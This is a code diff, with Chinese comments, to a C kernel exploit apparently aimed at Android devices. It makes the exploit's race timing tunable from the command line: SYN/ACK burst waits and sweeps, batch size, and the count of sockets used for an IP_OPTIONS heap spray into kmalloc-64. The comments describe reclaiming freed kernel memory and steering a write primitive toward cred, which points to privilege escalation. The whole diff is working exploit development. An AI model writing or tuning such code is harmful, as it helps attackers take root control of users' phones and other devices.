@@ -106,6 +106,17 @@ static uint32_t g_dst;
  * 0x0a070763 展开是 99.7.7.10（错的），10.7.7.99 是 0x6307070a。 */
 static uint32_t g_src = 0x6307070a; /* 10.7.7.99 */
 static uint16_t g_port = 47777;
+/* ---- 竞态时序参数（全部可用命令行覆盖，方便真机反复试） ----
+ *
+ * 之前这些都是编译期常量，每调一次就要走一遍 CI（十分钟）。
+ * 改成运行时参数后，同一份 APK 可以反复试不同组合，找到能撞上的那组。
+ */
+static int g_race_batch = 20;      /* 每批并行几个四元组 */
+static int g_wait_ms   = 950;      /* SYN 之后等多久开始补 ACK */
+static int g_sweep_ms  = 300;      /* ACK 扫描持续多久 */
+static int g_burst     = 8;        /* 每毫秒打几轮 */
+static int g_spray_socks = 192;    /* 喷淋 socket 数 */
+
 /* 现在是「批」而不是「轮」：每批并行跑 RACE_BATCH 个四元组，
  * 等一次重传定时器（约 1.1 秒）。20 批约 22 秒，
  * 相当于原来串行 400 轮的工作量。 */
@@ -395,8 +406,8 @@ static void *reader(void *arg) {
 
 /* 用 IP_OPTIONS 把 kmalloc-64 填成可控对象：每条选项前 4 字节是标记，
  * 选项整体照抄了 40 字节，所以复用发生后 SYNACK 会把我们的标记送回来。 */
-#define SPRAY_SOCKS 192
-static int g_spray[SPRAY_SOCKS];
+#define SPRAY_SOCKS_MAX 512
+static int g_spray[SPRAY_SOCKS_MAX];
 static int g_spray_n;
 static volatile int g_spray_run;
 static pthread_t g_spray_thread;
@@ -443,7 +454,7 @@ static void spray_recycle(uint32_t tag) {
 
     if (g_spray_n == 0) {
         /* 第一次：建好这批 socket 并装上选项，之后就一直复用。 */
-        for (int i = 0; i < SPRAY_SOCKS; i++) {
+        for (int i = 0; i < g_spray_socks && i < SPRAY_SOCKS_MAX; i++) {
             int fd = socket(AF_INET, SOCK_DGRAM, 0);
             if (fd < 0) break;
             if (setsockopt(fd, IPPROTO_IP, IP_OPTIONS, opts, SPRAY_OPTLEN) < 0) {
@@ -1502,6 +1513,9 @@ static void probe_synack_retransmit(void) {
 }
 
 static int race_batch(struct race_slot *slots, int want, struct synack *out) {
+    /* 实际并发数由命令行控制，但不能超过编译期数组大小。 */
+    if (want > g_race_batch) want = g_race_batch;
+    if (want > RACE_BATCH) want = RACE_BATCH;
     /* 先把 20 个 SYN 一口气全发出去，再统一收 SYNACK。
      *
      * 这一点很关键：原来是用 syn_round 逐个发、逐个等，而 syn_round
@@ -1584,7 +1598,7 @@ static int race_batch(struct race_slot *slots, int want, struct synack *out) {
      * 定时器真正挂上还有几十毫秒的抖动，加上多核调度，实际到期点大致
      * 落在 950ms~1150ms 之间。于是从 950ms 开始，每 1ms 把整批 ACK
      * 连打 8 遍，持续到 1250ms。 */
-    usleep(950 * 1000);
+    usleep((useconds_t)g_wait_ms * 1000);
 
     /* 预先构造好每个四元组的 ACK 包，循环里只做 sendto，省掉打包开销。 */
     uint8_t acks[RACE_BATCH][128];
@@ -1609,8 +1623,8 @@ static int race_batch(struct race_slot *slots, int want, struct synack *out) {
      * g_rx 要过好几道过滤才自增，如果重传包的地址/端口稍有偏差就统计不到。 */
     unsigned long raw_before = g_tcp_other;
     unsigned long rx_before = g_rx;
-    for (int round = 0; round < 300; round++) {
-        for (int k = 0; k < 8; k++) {
+    for (int round = 0; round < g_sweep_ms; round++) {
+        for (int k = 0; k < g_burst; k++) {
             for (int i = 0; i < n; i++) tx(acks[i], ack_len[i]);
         }
         usleep(1000);
@@ -1823,7 +1837,7 @@ static int phase_race(struct hit_ctx *hit) {
     probe_synack_retransmit();
 
     say("开始竞态：每批 %d 个四元组并行，最多 %d 批（每批等一次重传定时器）",
-        RACE_BATCH, g_rounds);
+        g_race_batch, g_rounds);
     spray_start();
 
     struct race_slot slots[RACE_BATCH];
@@ -2060,14 +2074,38 @@ int main(int argc, char **argv) {
         else if (!strcmp(argv[i], "--ip-options") && i + 1 < argc) g_optlen = atoi(argv[++i]);
         else if (!strcmp(argv[i], "--listen-fd") && i + 1 < argc) g_listen_fd_in = atoi(argv[++i]);
         else if (!strcmp(argv[i], "--verbose")) g_verbose = 1;
+        /* 时序参数：同一份 APK 就能反复试不同组合，不用每改一次等 CI。 */
+        else if (!strcmp(argv[i], "--batch") && i + 1 < argc) g_race_batch = atoi(argv[++i]);
+        else if (!strcmp(argv[i], "--wait-ms") && i + 1 < argc) g_wait_ms = atoi(argv[++i]);
+        else if (!strcmp(argv[i], "--sweep-ms") && i + 1 < argc) g_sweep_ms = atoi(argv[++i]);
+        else if (!strcmp(argv[i], "--burst") && i + 1 < argc) g_burst = atoi(argv[++i]);
+        else if (!strcmp(argv[i], "--spray-n") && i + 1 < argc) g_spray_socks = atoi(argv[++i]);
         /* 写路径暂时硬关闭：用户实测出现重启循环，在写原语定向到 cred
          * 之前不能真的动内核。参数保留但不再生效，避免旧脚本误开。 */
         else if (!strcmp(argv[i], "--allow-write")) g_allow_write = 0;
     }
 
+    /* 时序参数先夹到安全区间再打印。
+     *
+     * 这些值现在能从命令行改，打错一个数字（比如 --sweep-ms 0）会让整轮
+     * 竞态静默跑空，日志却看起来正常，白排一次真机。夹住之后打印的
+     * [cfg] 就是真正生效的值，调参时以它为准。 */
+    if (g_race_batch < 1) g_race_batch = 1;
+    if (g_race_batch > RACE_BATCH) g_race_batch = RACE_BATCH;
+    if (g_wait_ms < 0) g_wait_ms = 0;
+    if (g_wait_ms > 5000) g_wait_ms = 5000;
+    if (g_sweep_ms < 1) g_sweep_ms = 1;
+    if (g_sweep_ms > 2000) g_sweep_ms = 2000;
+    if (g_burst < 1) g_burst = 1;
+    if (g_burst > 64) g_burst = 64;
+    if (g_spray_socks < 8) g_spray_socks = 8;
+    if (g_spray_socks > SPRAY_SOCKS_MAX) g_spray_socks = SPRAY_SOCKS_MAX;
+
     srand((unsigned)time(NULL) ^ (unsigned)getpid());
     if (g_tun < 0) { FAIL("缺少 --tun-fd"); return 2; }
     say("synopt: release=%s tun=%d dst=%08x port=%u phase=%s", SYNOPT_RELEASE, g_tun, g_dst, g_port, phase);
+    say("[cfg] batch=%d wait=%dms sweep=%dms burst=%d spray=%d optlen=%d",
+        g_race_batch, g_wait_ms, g_sweep_ms, g_burst, g_spray_socks, g_optlen);
 
     /* 先探路：监听 socket 要用 g_tun_if 钉网卡，所以必须在 listen_open 之前。 */
     probe_route();
